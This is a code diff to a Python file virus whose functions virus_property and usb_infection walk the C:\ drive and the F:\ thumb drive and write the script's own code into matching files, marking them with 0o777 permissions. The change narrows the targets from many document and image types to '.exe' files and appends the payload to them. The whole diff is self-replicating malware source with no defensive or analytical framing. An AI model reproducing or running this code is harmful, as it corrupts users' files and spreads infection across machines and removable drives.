@@ -28,22 +28,19 @@ targets = ('.txt', '.docx', '.doc', '.lnk', '.xlsx', '.pdf', '.zip', '.ppt',
 
 def virus_property():
     # Infect files in current user
-    target = ('txt', '.pdf', '.png', '.exe', '.docx', '.doc', '.lnk', '.zip',
-              '.ppt', '.gz', '.rar', '.jpg', '.jpeg', 'gif' '.tar', '.ppt',
-              '.xls', '.xlsx')
+    target = '.exe'
     path = 'C:\\'
     for r, d, files in os.walk(path):
         for file in files:
             if file.endswith(target):
                 try:
-                    with open(file, 'rb+') as g:
-                        line = g.readlines()
-                        if status not in line[8]:
+                    with open(file, 'ab+') as g:
+                        line = g.read()
+                        if status not in line:
                             g.seek(0, 0)
                             with open(sys.argv[0], 'rb+') as c:
-                                lines = c.read()
-                                line[1] = lines
-                                g.writelines(line)
+                                line = c.read()
+                                g.write('\n' + line)
                                 g.close()
                                 c.close()
                                 os.chmod(file, 0o777)
@@ -56,23 +53,20 @@ def virus_property():
 
 def usb_infection():
     # Infect Thumb drives In F:// drive
-    target = ('txt', '.pdf', '.png', '.exe', '.docx', '.doc', '.lnk', '.zip',
-              '.ppt', '.gz', '.rar', '.jpg', '.jpeg', 'gif', '.tar', '.ppt',
-              '.xls', '.xlsx')
+    target = '.exe'
     path = 'F:\\'
     try:
         for r, d, files in os.walk(path):
             for file in files:
                 if file.endswith(target):
                     try:
-                        with open(file, 'rb+') as g:
-                            line = g.readlines()
-                            if status not in line[8]:
+                        with open(file, 'ab+') as g:
+                            line = g.read()
+                            if status not in line:
                                 g.seek(0, 0)
                                 with open(sys.argv[0], 'rb+') as c:
-                                    lines = c.read()
-                                    line[1] = lines
-                                    g.writelines(line)
+                                    line = c.read()
+                                    g.write('\n' + line)
                                     g.close()
                                     c.close()
                                     os.chmod(file, 0o777)
